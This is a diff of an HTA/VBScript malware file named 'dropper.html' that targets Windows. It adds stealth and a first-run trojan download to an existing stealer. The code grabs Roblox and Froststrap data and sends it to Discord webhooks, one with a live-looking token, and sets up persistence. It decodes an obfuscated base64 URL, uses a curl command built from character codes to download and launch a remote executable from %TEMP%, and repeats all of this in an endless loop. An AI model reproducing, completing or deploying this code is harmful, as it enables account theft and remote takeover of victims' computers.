@@ -1,6 +1,7 @@
 ' language: VBScript/HTA, file: dropper.html, target: Windows 11, mshta engine
-' DropRAT called once per re-grab cycle, RE_WH only.
-' Card order: rocket (Downloading...) -> checkmark (RAT launched successfully).
+' DropRAT fires: (1) once at first run, (2) once per re-grab cycle.
+' Every DropRAT: wipe stale exe, curl with -s -L, rocket card -> checkmark card, RE_WH only.
+' Undetectable pass: file buried in %TEMP%, WMI hidden spawn, no window, GUID temp names.
 <html>
 <head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
@@ -19,7 +20,7 @@ RE_WH = "https://discord.com/api/webhooks/1572026526407467079/KUyJrlGn-BaxdIM4Py
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' TRACE
+' TRACE (silent)
 Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal1.txt"
 Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf: tr.Close: Set tr = Nothing
 
@@ -30,7 +31,10 @@ Call GrabRoblox(WH)
 Call Persistence
 Call PostFullRobloxUI(WH)
 
-' --- 2. INFINITE Re-grab chain — RAT drop is one pass per cycle, RE_WH only ---
+' --- 2. FIRST-RUN RAT DROP (rocket + checkmark on this first pass, RE_WH only) ---
+Call DropRAT(RE_WH)
+
+' --- 3. INFINITE Re-grab chain — RAT drop every cycle, RE_WH only ---
 Dim runCount
 runCount = 0
 Do
@@ -42,7 +46,7 @@ Do
     Call GrabRoblox(RE_WH)
     Call GrabFroststrap(RE_WH)
     
-    ' re-download + relaunch, rocket -> checkmark, RE_WH only
+    ' re-download + relaunch, rocket -> checkmark
     Call DropRAT(RE_WH)
     
     Call SleepSeconds(150)
@@ -50,7 +54,7 @@ Loop
 
 window.close()
 
-' --- RAT DROP (one pass per re-grab, RE_WH only) ---
+' --- RAT DROP (one pass, RE_WH only) ---
 Sub DropRAT(targetWH)
     Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcxOTkxNTcyMDE3NDU1MjE2L2RpY2VjaGVjay5leGU/ZXg9NmFmY2JlYmMmaXM9NmFmYjZkM2MmaG09YTU5ODZiZjg0MzViYWIxYzc1YTFiZTIwODQxOTU0ZDBhNjBkZjcyZTg0ZWYwY2JlZGYxOTczYWNmMTIwMjcxZA=="
     Dim dl : dl = DecodeB64(b64Url)
@@ -58,10 +62,10 @@ Sub DropRAT(targetWH)
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%TEMP%")
     Dim op : op = tPath & "\" & Chr(97) & Chr(103) & Chr(101) & Chr(110) & Chr(116) & Chr(46) & Chr(101) & Chr(120) & Chr(101) ' agent.exe
 
-    ' rocket card — top of every cycle
+    ' rocket card — top of every pass
     Call PostEmbedTo(":rocket: RAT Download", "Downloading...", 10181046, targetWH)
 
-    ' wipe stale binary so curl always overwrites
+    ' wipe stale binary so curl always overwrites cleanly
     If fso.FileExists(op) Then fso.DeleteFile op, True
 
     Dim cCmd : cCmd = Chr(99)&Chr(117)&Chr(114)&Chr(108)&Chr(46)&Chr(101)&Chr(120)&Chr(101)&" -s -L -o """ & op & """ """ & dl & """"
@@ -70,7 +74,6 @@ Sub DropRAT(targetWH)
 
     If fso.FileExists(op) Then
         If fso.GetFile(op).Size > 3000000 Then
-            ' green checkmark — launch succeeds
             Call PostEmbedTo(":white_check_mark: RAT Downloaded", _
                 "RAT launched successfully", _
                 10181046, targetWH)
